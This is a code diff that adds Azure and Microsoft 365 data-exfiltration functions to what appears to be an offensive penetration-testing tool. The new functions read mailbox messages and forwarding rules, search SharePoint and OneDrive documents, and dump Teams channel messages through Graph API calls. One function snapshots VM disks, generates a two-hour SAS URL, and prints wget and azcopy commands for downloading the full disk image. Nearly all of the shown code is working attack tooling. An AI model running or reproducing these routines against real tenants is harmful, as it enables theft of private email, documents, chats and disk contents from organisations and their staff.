@@ -992,3 +992,303 @@ export async function eventHubTap(args: string[], timeout: number): Promise<Hook
 
   return { output: output.join("\n"), findings }
 }
+
+export async function graphMailDump(args: string[], timeout: number): Promise<HookResult> {
+  const target = argVal(args, "--target") || "me"
+  const folder = argVal(args, "--folder") || "inbox"
+  const search = argVal(args, "--search")
+  const maxItems = argVal(args, "--max-items") || "25"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Microsoft Graph mail exfiltration...\n"]
+
+  const userPath = target === "me" ? "me" : `users/${target}`
+
+  const folders = await run("az", ["rest", "--method", "GET", "--url", `https://graph.microsoft.com/v1.0/${userPath}/mailFolders?$select=displayName,totalItemCount,unreadItemCount`, "-o", "json"], timeout)
+  if (folders.exitCode === 0) {
+    const folderList = tryJson(folders.stdout)?.value || []
+    output.push(`[+] Mail folders for ${target}:`)
+    for (const f of folderList) {
+      output.push(`    ${f.displayName} — ${f.totalItemCount} total, ${f.unreadItemCount} unread`)
+    }
+  }
+  if (folders.exitCode !== 0) {
+    output.push(`[-] Cannot access mail (needs Mail.Read or Mail.ReadWrite): ${folders.stderr.slice(0, 200)}`)
+    return { output: output.join("\n"), findings }
+  }
+
+  const searchParam = search ? `&$search="${search}"` : ""
+  const messages = await run("az", ["rest", "--method", "GET", "--url", `https://graph.microsoft.com/v1.0/${userPath}/mailFolders/${folder}/messages?$top=${maxItems}&$select=subject,from,receivedDateTime,hasAttachments,bodyPreview${searchParam}`, "-o", "json"], timeout)
+  if (messages.exitCode === 0) {
+    const msgList = tryJson(messages.stdout)?.value || []
+    output.push(`\n[+] Messages in ${folder}: ${msgList.length}`)
+    for (const m of msgList) {
+      output.push(`    [${m.receivedDateTime || "?"}] From: ${m.from?.emailAddress?.address || "?"} — ${m.subject || "(no subject)"}${m.hasAttachments ? " [ATTACHMENT]" : ""}`)
+      if (m.bodyPreview) output.push(`      ${String(m.bodyPreview).substring(0, 120)}...`)
+    }
+    if (msgList.length > 0) {
+      findings.push({
+        checkId: "AZ-MAIL-001",
+        provider: "azure",
+        severity: "critical",
+        status: "EXTRACTED",
+        resource: `mail://${target}/${folder}`,
+        title: `${msgList.length} emails extracted from ${target}/${folder}`,
+        details: `${search ? `Search: "${search}"` : "All messages"}. May contain sensitive business data, credentials, or PII.`,
+        remediation: "Review Mail.Read permissions, audit Graph API access logs",
+      })
+    }
+  }
+
+  const rules = await run("az", ["rest", "--method", "GET", "--url", `https://graph.microsoft.com/v1.0/${userPath}/mailFolders/inbox/messageRules`, "-o", "json"], timeout)
+  if (rules.exitCode === 0) {
+    const ruleList = tryJson(rules.stdout)?.value || []
+    if (ruleList.length > 0) {
+      output.push(`\n[+] Inbox rules: ${ruleList.length}`)
+      for (const r of ruleList) {
+        output.push(`    ${r.displayName} — enabled: ${r.isEnabled}`)
+        if (r.actions?.forwardTo?.length) output.push(`      [!] FORWARD TO: ${r.actions.forwardTo.map((f: Record<string, Record<string, string>>) => f.emailAddress?.address).join(", ")}`)
+        if (r.actions?.redirectTo?.length) output.push(`      [!] REDIRECT TO: ${r.actions.redirectTo.map((f: Record<string, Record<string, string>>) => f.emailAddress?.address).join(", ")}`)
+      }
+    }
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+export async function sharepointDump(args: string[], timeout: number): Promise<HookResult> {
+  const siteName = argVal(args, "--site")
+  const driveId = argVal(args, "--drive-id")
+  const search = argVal(args, "--search")
+  const maxItems = argVal(args, "--max-items") || "25"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] SharePoint / OneDrive document exfiltration...\n"]
+
+  const sites = await run("az", ["rest", "--method", "GET", "--url", "https://graph.microsoft.com/v1.0/sites?search=*&$select=displayName,webUrl,id&$top=50", "-o", "json"], timeout)
+  if (sites.exitCode === 0) {
+    const siteList = tryJson(sites.stdout)?.value || []
+    output.push(`[+] SharePoint sites: ${siteList.length}`)
+    for (const s of siteList) output.push(`    ${s.displayName} — ${s.webUrl}`)
+    if (siteList.length > 0) {
+      findings.push({
+        checkId: "AZ-SP-EXFIL-001",
+        provider: "azure",
+        severity: "high",
+        status: "ENUMERATED",
+        resource: "sharepoint://sites",
+        title: `${siteList.length} SharePoint sites accessible`,
+        details: "May contain sensitive documents, internal wikis, and shared files",
+        remediation: "Review Sites.Read.All permissions",
+      })
+    }
+  }
+  if (sites.exitCode !== 0) {
+    output.push(`[-] Cannot list SharePoint sites (needs Sites.Read.All): ${sites.stderr.slice(0, 200)}`)
+    return { output: output.join("\n"), findings }
+  }
+
+  if (search) {
+    const searchResult = await run("az", ["rest", "--method", "GET", "--url", `https://graph.microsoft.com/v1.0/search/query`, "--body", JSON.stringify({ requests: [{ entityTypes: ["driveItem"], query: { queryString: search }, from: 0, size: parseInt(maxItems) }] }), "--method", "POST", "-o", "json"], timeout)
+    if (searchResult.exitCode === 0) {
+      const hits = tryJson(searchResult.stdout)?.value?.[0]?.hitsContainers?.[0]?.hits || []
+      output.push(`\n[+] Search results for "${search}": ${hits.length}`)
+      for (const h of hits) {
+        const r = h.resource || {}
+        output.push(`    ${r.name} — ${r.webUrl || ""}`)
+        output.push(`      Size: ${r.size || "?"}B, Modified: ${r.lastModifiedDateTime || "?"}`)
+      }
+      if (hits.length > 0) {
+        findings.push({
+          checkId: "AZ-SP-EXFIL-002",
+          provider: "azure",
+          severity: "critical",
+          status: "EXTRACTED",
+          resource: "sharepoint://search",
+          title: `${hits.length} documents found matching "${search}"`,
+          details: "Sensitive documents accessible via Graph API search",
+          remediation: "Review document sharing and search permissions",
+        })
+      }
+    }
+  }
+
+  if (siteName) {
+    const siteInfo = await run("az", ["rest", "--method", "GET", "--url", `https://graph.microsoft.com/v1.0/sites?search=${siteName}&$top=1`, "-o", "json"], timeout)
+    if (siteInfo.exitCode === 0) {
+      const site = tryJson(siteInfo.stdout)?.value?.[0]
+      if (site) {
+        const drives = await run("az", ["rest", "--method", "GET", "--url", `https://graph.microsoft.com/v1.0/sites/${site.id}/drives?$select=name,id,driveType,quota`, "-o", "json"], timeout)
+        if (drives.exitCode === 0) {
+          const driveList = tryJson(drives.stdout)?.value || []
+          output.push(`\n[+] Document libraries in ${siteName}: ${driveList.length}`)
+          for (const d of driveList) {
+            output.push(`    ${d.name} (${d.driveType}) — ID: ${d.id}`)
+            if (d.quota) output.push(`      Used: ${Math.round((d.quota.used || 0) / 1024 / 1024)}MB / ${Math.round((d.quota.total || 0) / 1024 / 1024)}MB`)
+          }
+        }
+      }
+    }
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+export async function teamsDump(args: string[], timeout: number): Promise<HookResult> {
+  const teamName = argVal(args, "--team")
+  const channelName = argVal(args, "--channel")
+  const maxItems = argVal(args, "--max-items") || "25"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Microsoft Teams message exfiltration...\n"]
+
+  const teams = await run("az", ["rest", "--method", "GET", "--url", "https://graph.microsoft.com/v1.0/me/joinedTeams?$select=displayName,id,description", "-o", "json"], timeout)
+  if (teams.exitCode !== 0) {
+    output.push(`[-] Cannot list Teams (needs Team.ReadBasic.All or TeamMember.Read.All): ${teams.stderr.slice(0, 200)}`)
+    return { output: output.join("\n"), findings }
+  }
+
+  const teamList = tryJson(teams.stdout)?.value || []
+  output.push(`[+] Joined teams: ${teamList.length}`)
+  for (const t of teamList) output.push(`    ${t.displayName} — ${t.description || "no description"}`)
+
+  if (teamList.length > 0) {
+    findings.push({
+      checkId: "AZ-TEAMS-001",
+      provider: "azure",
+      severity: "high",
+      status: "ENUMERATED",
+      resource: "teams://joined",
+      title: `${teamList.length} Teams accessible`,
+      details: "Team channels may contain sensitive discussions, credentials, and files",
+      remediation: "Review Teams access and ChannelMessage.Read.All permissions",
+    })
+  }
+
+  const targetTeam = teamName
+    ? teamList.find((t: Record<string, string>) => t.displayName?.toLowerCase().includes(teamName.toLowerCase()))
+    : teamList[0]
+
+  if (!targetTeam) return { output: output.join("\n"), findings }
+
+  const channels = await run("az", ["rest", "--method", "GET", "--url", `https://graph.microsoft.com/v1.0/teams/${targetTeam.id}/channels?$select=displayName,id,membershipType`, "-o", "json"], timeout)
+  if (channels.exitCode === 0) {
+    const channelList = tryJson(channels.stdout)?.value || []
+    output.push(`\n[+] Channels in ${targetTeam.displayName}: ${channelList.length}`)
+    for (const c of channelList) output.push(`    ${c.displayName} (${c.membershipType || "standard"})`)
+
+    const targetChannel = channelName
+      ? channelList.find((c: Record<string, string>) => c.displayName?.toLowerCase().includes(channelName.toLowerCase()))
+      : channelList[0]
+
+    if (targetChannel) {
+      const messages = await run("az", ["rest", "--method", "GET", "--url", `https://graph.microsoft.com/v1.0/teams/${targetTeam.id}/channels/${targetChannel.id}/messages?$top=${maxItems}`, "-o", "json"], timeout)
+      if (messages.exitCode === 0) {
+        const msgList = tryJson(messages.stdout)?.value || []
+        output.push(`\n[+] Messages in #${targetChannel.displayName}: ${msgList.length}`)
+        for (const m of msgList) {
+          const from = m.from?.user?.displayName || m.from?.application?.displayName || "system"
+          const body = m.body?.content || ""
+          const text = body.replace(/<[^>]+>/g, "").trim()
+          output.push(`    [${m.createdDateTime || "?"}] ${from}: ${text.substring(0, 150)}`)
+        }
+        if (msgList.length > 0) {
+          findings.push({
+            checkId: "AZ-TEAMS-002",
+            provider: "azure",
+            severity: "critical",
+            status: "EXTRACTED",
+            resource: `teams://${targetTeam.displayName}/${targetChannel.displayName}`,
+            title: `${msgList.length} messages extracted from #${targetChannel.displayName}`,
+            details: "Team chat messages may contain credentials, internal discussions, and sensitive data",
+            remediation: "Review ChannelMessage.Read permissions, audit Graph API access",
+          })
+        }
+      }
+    }
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+export async function vmDiskDownload(args: string[], timeout: number): Promise<HookResult> {
+  const sub = argVal(args, "--subscription-id")
+  const action = argVal(args, "--action") || "list"
+  const vmName = argVal(args, "--vm-name")
+  const rg = argVal(args, "--resource-group")
+  const diskName = argVal(args, "--disk-name")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Azure VM disk download for offline analysis...\n"]
+
+  if (action === "list") {
+    const rgArgs = rg ? ["--resource-group", rg] : []
+    const vms = await az(["vm", "list", ...rgArgs, "--query", "[].{name:name,rg:resourceGroup,os:storageProfile.osDisk.osType,osDisk:storageProfile.osDisk.name,dataDisks:storageProfile.dataDisks[].name}"], sub, timeout)
+    if (vms.exitCode !== 0) return { output: "[-] Cannot list VMs", findings }
+    const vmList = tryJson(vms.stdout) || []
+    output.push(`[+] VMs and disks: ${vmList.length}`)
+    for (const v of vmList) {
+      output.push(`    ${v.name} (${v.rg}) — ${v.os}`)
+      output.push(`      OS disk: ${v.osDisk}`)
+      const dataDisks = v.dataDisks || []
+      if (dataDisks.length > 0) output.push(`      Data disks: ${dataDisks.join(", ")}`)
+    }
+
+    const unattached = await az(["disk", "list", "--query", "[?diskState=='Unattached'].{name:name,rg:resourceGroup,size:diskSizeGb,os:osType}"], sub, timeout)
+    if (unattached.exitCode === 0) {
+      const uList = tryJson(unattached.stdout) || []
+      if (uList.length > 0) {
+        output.push(`\n[+] Unattached disks (easy targets): ${uList.length}`)
+        for (const d of uList) {
+          output.push(`    ${d.name} (${d.size}GB, ${d.os || "data"}) — rg: ${d.rg}`)
+          findings.push({
+            checkId: "AZ-VMDISK-001",
+            provider: "azure",
+            severity: "high",
+            status: "FOUND",
+            resource: `disk://${d.name}`,
+            title: `Unattached disk: ${d.name} (${d.size}GB)`,
+            details: "Can be snapshotted and downloaded without affecting any running VM",
+            remediation: "Delete or encrypt unattached disks",
+          })
+        }
+      }
+    }
+    return { output: output.join("\n"), findings }
+  }
+
+  if (action === "snapshot_and_export") {
+    const target = diskName || (vmName && rg ? `${vmName}-osdisk` : null)
+    if (!target || !rg) return { output: "[-] --disk-name (or --vm-name) and --resource-group required", findings }
+
+    const snapName = `cs-exfil-${target.substring(0, 20)}`
+    output.push(`[*] Step 1: Creating snapshot of ${target}...`)
+    const snap = await az(["snapshot", "create", "--name", snapName, "--source", target, "--resource-group", rg, "--tags", "cyberstrike=exfil"], sub, timeout)
+    if (snap.exitCode !== 0) return { output: output.join("\n") + `\n[-] Snapshot failed: ${snap.stderr.slice(0, 200)}`, findings }
+    output.push(`[+] Snapshot created: ${snapName}`)
+
+    output.push(`\n[*] Step 2: Generating SAS URL...`)
+    const grant = await az(["snapshot", "grant-access", "--name", snapName, "--resource-group", rg, "--duration-in-seconds", "7200", "--access-level", "Read"], sub, timeout)
+    if (grant.exitCode === 0) {
+      const access = tryJson(grant.stdout)
+      const sasUrl = access?.accessSAS || ""
+      output.push(`[+] SAS URL generated (valid 2h):`)
+      output.push(`    ${sasUrl.substring(0, 100)}...`)
+      output.push(`\n[*] Step 3: Download with:`)
+      output.push(`    azcopy copy "${sasUrl}" ./exfil-${target}.vhd`)
+      output.push(`    Or: wget -O exfil-${target}.vhd "${sasUrl}"`)
+      output.push(`\n[*] Step 4: Mount and analyze offline:`)
+      output.push(`    guestmount -a exfil-${target}.vhd -i /mnt/disk`)
+      output.push(`    Or use Autopsy / FTK Imager for forensic analysis`)
+      findings.push({
+        checkId: "AZ-VMDISK-002",
+        provider: "azure",
+        severity: "critical",
+        status: "EXPLOITED",
+        resource: `disk://${target}`,
+        title: `VM disk ready for download: ${target}`,
+        details: `Snapshot: ${snapName}, SAS URL valid for 2 hours. Full disk contents available for offline analysis.`,
+        remediation: `Revoke: az snapshot revoke-access --name ${snapName} --resource-group ${rg} && az snapshot delete --name ${snapName} --resource-group ${rg}`,
+      })
+    }
+    if (grant.exitCode !== 0) output.push(`\n[-] Grant access failed: ${grant.stderr.slice(0, 200)}`)
+  }
+
+  return { output: output.join("\n"), findings }
+}
